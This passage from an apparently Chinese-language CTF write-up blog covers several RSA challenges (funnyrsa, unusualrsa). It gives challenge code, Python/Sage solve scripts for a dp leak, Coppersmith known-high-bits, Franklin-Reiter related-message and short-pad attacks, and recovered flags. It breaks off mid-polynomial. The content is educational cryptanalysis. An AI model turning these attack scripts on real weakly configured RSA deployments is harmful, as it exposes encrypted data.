<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">1043309573127959</span></span><br><span class="line">p1 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1 = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1 = <span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">986669223518417</span></span><br><span class="line">p2 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2 = <span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2 = <span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br><span class="line"></span><br><span class="line">phi1 = (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2 = (p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">n1 = p1*q1</span><br><span class="line">n2 = p2*q2</span><br><span class="line"></span><br><span class="line">d1 = invert(e1, phi1)</span><br><span class="line">d2 = invert(e2, phi2)</span><br><span class="line"></span><br><span class="line">c1_14 = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line">c2_14 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c1_14)</span><br><span class="line"><span class="built_in">print</span>(c2_14)</span><br></pre></td></tr></table></figure>

<p>首先用CRT将$m^{14}$转换成在模q1q2下，那个师傅还把p加上了，其实没有必要，选两个就好了<br>$$<br>\begin{align}<br>m^{14}\equiv c_1\ (mod\ q_1)\\<br>m^{14}\equiv c_2\ (mod\ q_2)<br>\end{align}<br>$$<br>解出来的解我们设为c3，将问题转换成新的rsa问题<br>$$<br>m^{14}\equiv c_3\ (mod\ q_1\cdot q_2)<br>$$<br>在如今的局势下，我们可以用上面的思路，先继续化简e，因为发现新的phi和7是互素的；出来的c很小，用小指数攻击就解出来<br>$$<br>c^2\equiv m\ (mod\ n)<br>$$<br>注意这里可不能用rabin，因为上面就说过，q是不满足rabin条件的，平方根算法倒可以试试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line">c = <span class="number">1468508928650711840448592864366550012730179472363882262465351327446412035872207980397128114769992338577161</span></span><br><span class="line">p = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">q = <span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(nthroot_mod(c, <span class="number">2</span>, p)))</span><br></pre></td></tr></table></figure>

<p>可解</p>
<h2 id="funnyrsa2"><a href="#funnyrsa2" class="headerlink" title="funnyrsa2"></a>funnyrsa2</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = getPrime(<span class="number">80</span>)</span><br><span class="line">q = getPrime(<span class="number">80</span>)</span><br><span class="line">r = getPrime(<span class="number">80</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="comment"># n = 897607935780955837078784515115186203180822213482989041398073067996023639</span></span><br><span class="line"><span class="comment"># c = 490571531583321382715358426750276448536961994273309958885670149895389968</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;what_that_fvck_r&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="funnyrsa3"><a href="#funnyrsa3" class="headerlink" title="funnyrsa3"></a>funnyrsa3</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">13851998696110232034312408768370264747862778787235362033287301947690834384177869107768578977872169953363148442670412868565346964490724532894099772144625540138618913694240688555684873934424471837897053658485573395777349902581306875149677867098014969597240339327588421766510008083189109825385296069501377605893298996953970043168244444585264894721914216744153344106498382558756181912535774309211692338879110643793628550244212618635476290699881188640645260075209594318725693972840846967120418641315829098807385382509029722923894508557890331485536938749583463709142484622852210528766911899504093351926912519458381934550361</span></span><br><span class="line">dp = <span class="number">100611735902103791101540576986246738909129436434351921338402204616138072968334504710528544150282236463859239501881283845616704984276951309172293190252510177093383836388627040387414351112878231476909883325883401542820439430154583554163420769232994455628864269732485342860663552714235811175102557578574454173473</span></span><br><span class="line">c = <span class="number">6181444980714386809771037400474840421684417066099228619603249443862056564342775884427843519992558503521271217237572084931179577274213056759651748072521423406391343404390036640425926587772914253834826777952428924120724879097154106281898045222573790203042535146780386650453819006195025203611969467741808115336980555931965932953399428393416196507391201647015490298928857521725626891994892890499900822051002774649242597456942480104711177604984775375394980504583557491508969320498603227402590571065045541654263605281038512927133012338467311855856106905424708532806690350246294477230699496179884682385040569548652234893413</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>dp泄漏攻击，看我博客<a href="https://blog.csdn.net/m0_49109277/article/details/113622053?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_49109277/article/details/113622053?spm=1001.2014.3001.5501</a></p>
<h2 id="unusualrsa1"><a href="#unusualrsa1" class="headerlink" title="unusualrsa1"></a>unusualrsa1</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(long_to_bytes(randint(<span class="number">0</span>,<span class="number">30</span>))*<span class="number">208</span>+flag)</span><br><span class="line"><span class="keyword">assert</span>(m.bit_length()==<span class="number">2044</span>)</span><br><span class="line"><span class="built_in">print</span>((m&gt;&gt;<span class="number">315</span>)&lt;&lt;<span class="number">315</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,<span class="number">3</span>,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#14113948189208713011909396304970377626324044633561155020366406284451614054260708934598840781397326960921718892801653205159753091559901114082556464576477585198060530094478860626532455065960136263963965819002575418616768412539016154873800614138683106056209070597212668250136909436974469812231498651367459717175769611385545792201291192023843434476550550829737236225181770896867698281325858412643953550465132756142888893550007041167700300621499970661661288422834479368072744930285128061160879720771910458653611076539210357701565156322144818787619821653007453741709031635862923191561438148729294430924288173571196757351837</span></span><br><span class="line"><span class="comment">#1520800285708753284739523608878585974609134243280728660335545667177630830064371336150456537012842986526527904043383436211487979254140749228004148347597566264500276581990635110200009305900689510908049771218073767918907869112593870878204145615928290375086195098919355531430003571366638390993296583488184959318678321571278510231561645872308920917404996519309473979203661442792048291421574603018835698487725981963573816645574675640357569465990665689618997534740389987351864738104038598104713275375385003471306823348792559733332094774873827383320058176803218213042061965933143968710199376164960850951030741280074168795136</span></span><br><span class="line"><span class="comment">#6635663565033382363211849843446648120305449056573116171933923595209656581213410699649926913276685818674688954045817246263487415328838542489103709103428412175252447323358040041217431171817865818374522191881448865227314554997131690963910348820833080760482835650538394814181656599175839964284713498394589419605748581347163389157651739759144560719049281761889094518791244702056048080280278984031050608249265997808217512349309696532160108250480622956599732443714546043439089844571655280770141647694859907985919056009576606333143546094941635324929407538860140272562570973340199814409134962729885962133342668270226853146819</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>已知m高位，用CopperSmith已知明文高位攻击</p>
<p>拿la佬的脚本来做la佬的题，嘿嘿</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">14113948189208713011909396304970377626324044633561155020366406284451614054260708934598840781397326960921718892801653205159753091559901114082556464576477585198060530094478860626532455065960136263963965819002575418616768412539016154873800614138683106056209070597212668250136909436974469812231498651367459717175769611385545792201291192023843434476550550829737236225181770896867698281325858412643953550465132756142888893550007041167700300621499970661661288422834479368072744930285128061160879720771910458653611076539210357701565156322144818787619821653007453741709031635862923191561438148729294430924288173571196757351837</span></span><br><span class="line">mbar = <span class="number">1520800285708753284739523608878585974609134243280728660335545667177630830064371336150456537012842986526527904043383436211487979254140749228004148347597566264500276581990635110200009305900689510908049771218073767918907869112593870878204145615928290375086195098919355531430003571366638390993296583488184959318678321571278510231561645872308920917404996519309473979203661442792048291421574603018835698487725981963573816645574675640357569465990665689618997534740389987351864738104038598104713275375385003471306823348792559733332094774873827383320058176803218213042061965933143968710199376164960850951030741280074168795136</span></span><br><span class="line">c = <span class="number">6635663565033382363211849843446648120305449056573116171933923595209656581213410699649926913276685818674688954045817246263487415328838542489103709103428412175252447323358040041217431171817865818374522191881448865227314554997131690963910348820833080760482835650538394814181656599175839964284713498394589419605748581347163389157651739759144560719049281761889094518791244702056048080280278984031050608249265997808217512349309696532160108250480622956599732443714546043439089844571655280770141647694859907985919056009576606333143546094941635324929407538860140272562570973340199814409134962729885962133342668270226853146819</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">kbits = <span class="number">315</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x) ^ e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(mbar + x0))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原理</p>
</blockquote>
<p>先搞清楚题目意思；下面这个print操作显然是将m的低315位变成0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>((m&gt;&gt;<span class="number">315</span>)&lt;&lt;<span class="number">315</span>)</span><br></pre></td></tr></table></figure>

<p>我们直接将m转变成字节，得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0cflag&#123;r54X\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>显然前面208个<code>\x0c</code>就是随机生成的填充，还有一点flag的头部信息，剩下就全部都是0了</p>
<blockquote>
<p>CopperSmith已知明文高位攻击</p>
</blockquote>
<p>而CopperSmith已知明文高位攻击的模式就是，</p>
<p>当$|x|\leq N^{\frac{1}{e}}$，其中$m=mbar+x$时，下列关于x的方程<br>$$<br>c=m^e\ mod\ n=(mbar+x)^e\ mod\ n，其中mbar=(m&gt;&gt;kbits)&lt;&lt;kbits<br>$$<br>有解</p>
<p>首先我们验证下，条件是否满足；x是315位的，$N^\frac{1}{e}$约有683，条件成立</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708112626326.png" alt="image-20210708112626326"></p>
<p>所以显然对于已知明文高位的攻击，还需要e比较小这个条件，不然e=65537明显解不出来</p>
<p>然后看代码理解；主要的是用到了格，求小根这一类的东西。先构造好上面的方程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = (mbar + x) ^ e - c</span><br></pre></td></tr></table></figure>

<p>然后直接small_roots，设置一下参数。但是更多的也不懂了</p>
<h2 id="unusualrsa2"><a href="#unusualrsa2" class="headerlink" title="unusualrsa2"></a>unusualrsa2</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, x, y</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(i-<span class="number">5</span>)*i+<span class="number">6</span>==<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> x]))</span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(j-<span class="number">15</span>)*j+<span class="number">44</span>==<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> y]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,x),<span class="number">17</span>,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,y),<span class="number">17</span>,n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#23772599983135215481563178266884362291876571759991288577057472733374903836591330410574958472090396886895304944176208711481780781286891334062794555288959410390926474473859289842654809538435377431088422352076225067494924657598298955407771484146155998883073439266427190212827600119365643065276814044272790573450938596830336430371987561905132579730619341196199420897034988685012777895002554746080384319298123154671447844799088258541911028041717897434816921424155687677867019535399434825468160227242441375503664915265223696139025407768146464383537556265875013085702422829200814612395116961538432886116917063119749068212699</span></span><br><span class="line"><span class="comment">#10900151504654409767059699202929100225155892269473271859207513720755903691031362539478242920144073599515746938827937863835169270383721094542639011665235593065932998091574636525973099426040452626893461449084383663453549354608769727777329036059746386523843912382289597182615339786437186169811342356085836838520978047561127661777189045888648773949147220411427306098338616422692914110656004863767719312410906124366000507952960331116878197129010412361636679449281808407214524741732730279777729251515759320442591663641984363061618865267606007355576230009922421807527598213455112981354590909603317525854070358390622096569841</span></span><br><span class="line"><span class="comment">#17298679220717326374674940612143058330715465693318467692839033642321129433471254547497087746971317567301086124779289015934582615377165560688447452762043163082394944604062014490446763247008217251611443338103074143809936437694543761369945095202092750900940979469994907399829695696313513303922266742415376818434932335640062684245008822643258497589196668426788916969378417960200705779461808292296450298558001909603602502604228973101048082095642290047196235959438278631661658312398313171590515776453711432353011579809351076532129444735206408591345372296372378396539831385036814349328459266432393612919118094115543053115450</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>今年过年的时候做的，当时也写了WP。主要分两步吧，先求出x和y</p>
<p>当时有师傅在我博客下面评论，说x和y不一定是只有两个元素，问我为什么这样还可以做；当时我也只给了个肌无力的回答</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708115429140.png" alt="image-20210708115429140"></p>
<p>现在，我已不再是曾经那个菜鸡，而是弱鸡</p>
<p>我们再来分析一下，assert就是条件。首先lambda匿名函数里的x和y并非题目里的x和y，参数罢了；其次这个列表中的元素是True和False，对于secret中的x，只有所有的元素都满足(i-5)*i+6==0这个等式，列表中的所有元素才都是Ture，也只有这样用reduce不断迭代套用x&amp;y最后的返回值才会是True，整个assert才不会报错。y同理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(i-<span class="number">5</span>)*i+<span class="number">6</span>==<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> x]))</span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(j-<span class="number">15</span>)*j+<span class="number">44</span>==<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> y]))</span><br></pre></td></tr></table></figure>

<p>所以x和y里面可以有多个元素，不止两个，但比如x，里面就能出现2或者3，管你是[2,3,3,3]，还是[2,3,3,3,2,3,3,3]。</p>
<p>至于下面一个多项式，正如那位师傅说的那样，理论上确实，没有证据这不是一个关于m的多项式，而且系数只有2或3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,x),<span class="number">17</span>,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,y),<span class="number">17</span>,n))</span><br></pre></td></tr></table></figure>

<p>总之之前的解法，DDDD，没有比我更懂CTF签到~，就当x=[2,3]，y=[4,11]了，别的情况也没有更多的条件可以明确指明</p>
<p>所以我们得到了<br>$$<br>\begin{align}<br>c=(2m+3)^{17}\ mod\ n\\<br>c=(4m+11)^{17}\ mod\ n<br>\end{align}<br>$$<br>相当于换一下变量<br>$$<br>c=x^{17}\ mod\ n<br>$$<br>$$<br>c=(2x+5)^{17}\ mod\ n<br>$$<br>我们可以很明显地看到了其中蕴含的线性关系</p>
<blockquote>
<p>Coppersmith’s Short-pad Attack &amp; Related Message Attack（Franklin-Reiter攻击）</p>
</blockquote>
<p>从la佬的博客中据悉，所谓的padding过短，就是对应多项式的根会过小；提供了两个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本1</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">c1, c2, n, e</span>):</span></span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="comment"># replace a,b,c,d</span></span><br><span class="line">    g1 = (a*x+b)^e - c1</span><br><span class="line">    g2 = (c*x+d)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">c1 =</span><br><span class="line">c2 =</span><br><span class="line">n =</span><br><span class="line">e =</span><br><span class="line">m1 = attack(c1, c2, n, e)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="string">&quot;%x&quot;</span> % <span class="built_in">int</span>(m1)))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n =</span><br><span class="line">    e =</span><br><span class="line">    c1 =</span><br><span class="line">    c2 =</span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;difference of two messages is %d&quot;</span> % diff)</span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m1:&quot;</span>, m1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m2:&quot;</span>, m1 + diff)</span><br></pre></td></tr></table></figure>

<p>这道题我们魔改脚本1就能出来，不贴了，之前贴过</p>
<h2 id="unusualrsa3"><a href="#unusualrsa3" class="headerlink" title="unusualrsa3"></a>unusualrsa3</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line">p:</span><br><span class="line"><span class="number">2470567871</span></span><br><span class="line"></span><br><span class="line">N:</span><br><span class="line"><span class="number">1932231392</span>*x^<span class="number">255</span> + <span class="number">1432733708</span>*x^<span class="number">254</span> + <span class="number">1270867914</span>*x^<span class="number">253</span> + <span class="number">1573324635</span>*x^<span class="number">252</span> + <span class="number">2378103997</span>*x^<span class="number">251</span> + <span class="number">820889786</span>*x^<span class="number">250</span> + <span class="number">762279735</span>*x^<span class="number">249</span> + <span class="number">1378353578</span>*x^<span class="number">248</span> + <span class="number">1226179520</span>*x^<span class="number">247</span> + <span class="number">657116276</span>*x^<span class="number">246</span> + <span class="number">1264717357</span>*x^<span class="number">245</span> + <span class="number">1015587392</span>*x^<span class="number">244</span> + <span class="number">849699356</span>*x^<span class="number">243</span> + <span class="number">1509168990</span>*x^<span class="number">242</span> + <span class="number">2407367106</span>*x^<span class="number">241</span> + <span class="number">873379233</span>*x^<span class="number">240</span> + <span class="number">2391647981</span>*x^<span class="number">239</span> + <span class="number">517715639</span>*x^<span class="number">238</span> + <span class="number">828941376</span>*x^<span class="number">237</span> + <span class="number">843708018</span>*x^<span class="number">236</span> + <span class="number">1526075137</span>*x^<span class="number">235</span> + <span class="number">1499291590</span>*x^<span class="number">234</span> + <span class="number">235611028</span>*x^<span class="number">233</span> + <span class="number">19615265</span>*x^<span class="number">232</span> + <span class="number">53338886</span>*x^<span class="number">231</span> + <span class="number">434434839</span>*x^<span class="number">230</span> + <span class="number">902171938</span>*x^<span class="number">229</span> + <span class="number">516444143</span>*x^<span class="number">228</span> + <span class="number">1984443642</span>*x^<span class="number">227</span> + <span class="number">966493372</span>*x^<span class="number">226</span> + <span class="number">1166227650</span>*x^<span class="number">225</span> + <span class="number">1824442929</span>*x^<span class="number">224</span> + <span class="number">930231465</span>*x^<span class="number">223</span> + <span class="number">1664522302</span>*x^<span class="number">222</span> + <span class="number">1067203343</span>*x^<span class="number">221</span> + <span class="number">28569139</span>*x^<span class="number">220</span> + <span class="number">2327926559</span>*x^<span class="number">219</span> + <span class="number">899788156</span>*x^<span class="number">218</span> + <span class="number">296985783</span>*x^<span class="number">217</span> + <span class="number">1144578716</span>*x^<span class="number">216</span> + <span class="number">340677494</span>*x^<span class="number">215</span> + <span class="number">254306901</span>*x^<span class="number">214</span> + <span class="number">766641243</span>*x^<span class="number">213</span> + <span class="number">1882320336</span>*x^<span class="number">212</span> + <span class="number">2139903463</span>*x^<span class="number">211</span> + <span class="number">1904225023</span>*x^<span class="number">210</span> + <span class="number">475412928</span>*x^<span class="number">209</span> + <span class="number">127723603</span>*x^<span class="number">208</span> + <span class="number">2015416361</span>*x^<span class="number">207</span> + <span class="number">1500078813</span>*x^<span class="number">206</span> + <span class="number">1845826007</span>*x^<span class="number">205</span> + <span class="number">797486240</span>*x^<span class="number">204</span> + <span class="number">85924125</span>*x^<span class="number">203</span> + <span class="number">1921772796</span>*x^<span class="number">202</span> + <span class="number">1322682658</span>*x^<span 